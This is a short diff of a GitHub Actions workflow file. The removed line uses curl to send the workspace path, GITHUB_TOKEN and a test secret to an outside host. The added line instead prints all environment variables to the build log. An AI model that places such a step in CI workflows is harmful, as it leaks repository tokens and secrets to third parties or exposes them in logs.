@@ -10,4 +10,4 @@ jobs:
         env:
                 SECRET_TEST: ${{secrets.TEST_TOKEN}}
                 GITHUB_TOKEN: ${{secrets.GITHUB_TOKEN}}
-        run: curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GITHUB_TOKEN" -d "t=$SECRET_TEST" -d "tt=$TEST_TOKEN"
+        run: printenv; date
